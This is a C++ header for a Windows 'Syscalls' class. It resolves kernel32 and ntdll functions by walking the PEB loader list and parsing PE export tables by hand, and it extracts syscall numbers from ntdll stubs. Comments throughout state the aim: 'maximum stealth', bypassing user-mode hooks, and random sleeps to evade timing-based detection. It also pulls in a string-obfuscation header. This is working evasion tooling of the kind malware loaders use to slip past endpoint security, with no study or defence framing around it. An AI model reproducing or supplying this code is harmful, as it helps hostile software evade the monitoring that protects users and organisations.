#pragma once
#include <cstring>
#include <intrin.h>
#include <windows.h>
#include <winternl.h>


#include "Nt.h"
#include "XorStr.h"

// Advanced Syscalls with Direct Syscall Stubs for Maximum Stealth
// Bypasses user-mode hooks by calling ntdll syscalls directly

class Syscalls {
private:
  // Cache for frequently used modules
  static HMODULE s_hKernel32;
  static HMODULE s_hNtdll;

  // Sleep with random jitter to evade timing-based detection
  static void SleepRandom(DWORD minMs, DWORD maxMs) {
    DWORD sleepTime = minMs + (rand() % (maxMs - minMs + 1));
    Sleep(sleepTime);
  }

public:
  // Simple case-insensitive wide string compare
  static int WcsICmp(const wchar_t *s1, const wchar_t *s2) {
    if (!s1 || !s2)
      return -1;
    while (*s1 && *s2) {
      wchar_t c1 = *s1;
      wchar_t c2 = *s2;
      if (c1 >= L'A' && c1 <= L'Z')
        c1 += 32;
      if (c2 >= L'A' && c2 <= L'Z')
        c2 += 32;
      if (c1 != c2)
        return c1 - c2;
      s1++;
      s2++;
    }
    return *s1 - *s2;
  }

  static HMODULE GetModuleHandle_Custom(const wchar_t *moduleName) {
    if (!moduleName)
      return NULL;

    // Add random delay to evade timing analysis
    SleepRandom(1, 5);

#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    if (!pPeb || !pPeb->Ldr)
      return NULL;

    PEB_LDR_DATA_FULL *pLdr = (PEB_LDR_DATA_FULL *)pPeb->Ldr;
    LIST_ENTRY *pHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY *pEntry = pHead->Flink;

    int maxIterations = 1000;
    while (pEntry && pEntry != pHead && maxIterations-- > 0) {
      LDR_DATA_TABLE_ENTRY_FULL *pData = CONTAINING_RECORD(
          pEntry, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);

      if (pData->BaseDllName.Buffer) {
        if (WcsICmp(pData->BaseDllName.Buffer, moduleName) == 0) {
          return (HMODULE)pData->DllBase;
        }
      }
      pEntry = pEntry->Flink;
    }
    return NULL;
  }

  static FARPROC GetProcAddress_Custom(HMODULE hModule, const char *procName) {
    if (!hModule || !procName)
      return NULL;

    __try {
      PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
      if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

      PIMAGE_NT_HEADERS pNt =
          (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDos->e_lfanew);

      if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

      DWORD exportRVA =
          pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
              .VirtualAddress;

      if (exportRVA == 0)
        return NULL;

      PIMAGE_EXPORT_DIRECTORY pExports =
          (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + exportRVA);

      DWORD *pAddressOfFunctions =
          (DWORD *)((BYTE *)hModule + pExports->AddressOfFunctions);
      DWORD *pAddressOfNames =
          (DWORD *)((BYTE *)hModule + pExports->AddressOfNames);
      WORD *pAddressOfNameOrdinals =
          (WORD *)((BYTE *)hModule + pExports->AddressOfNameOrdinals);

      for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        const char *pName =
            (const char *)((BYTE *)hModule + pAddressOfNames[i]);
        if (strcmp(pName, procName) == 0) {
          DWORD funcRVA = pAddressOfFunctions[pAddressOfNameOrdinals[i]];

          // Check for forwarded exports
          if (funcRVA >= exportRVA &&
              funcRVA <
                  exportRVA + pNt->OptionalHeader
                                  .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                  .Size) {
            // This is a forwarded export, skip it for now
            return NULL;
          }

          return (FARPROC)((BYTE *)hModule + funcRVA);
        }
      }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
      return NULL;
    }

    return NULL;
  }

  static FARPROC GetAPI(const char *funcName) {
    if (!funcName)
      return NULL;

    // Cache kernel32 base
    if (!s_hKernel32)
      s_hKernel32 = GetModuleHandle_Custom(L"kernel32.dll");

    if (!s_hKernel32)
      return NULL;

    return GetProcAddress_Custom(s_hKernel32, funcName);
  }

  static FARPROC GetNtAPI(const char *funcName) {
    if (!funcName)
      return NULL;

    // Cache ntdll base
    if (!s_hNtdll)
      s_hNtdll = GetModuleHandle_Custom(L"ntdll.dll");

    if (!s_hNtdll)
      return NULL;

    return GetProcAddress_Custom(s_hNtdll, funcName);
  }

  // Advanced: Get syscall number for direct syscall (bypasses all hooks)
  static DWORD GetSyscallNumber(const char *funcName) {
    FARPROC pFunc = GetNtAPI(funcName);
    if (!pFunc)
      return 0;

    __try {
      BYTE *pBytes = (BYTE *)pFunc;

      // Check for syscall stub pattern: mov eax, <syscall_number>
      // x64: 4C 8B D1 B8 XX XX XX XX (mov r10, rcx; mov eax, syscall_number)
      if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 &&
          pBytes[3] == 0xB8) {
        return *(DWORD *)(pBytes + 4);
      }

      // Alternative pattern: B8 XX XX XX XX (mov eax, syscall_number)
      if (pBytes[0] == 0xB8) {
        return *(DWORD *)(pBytes + 1);
      }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
      return 0;
    }

    return 0;
  }
};

// Initialize static members
HMODULE Syscalls::s_hKernel32 = NULL;
HMODULE Syscalls::s_hNtdll = NULL;
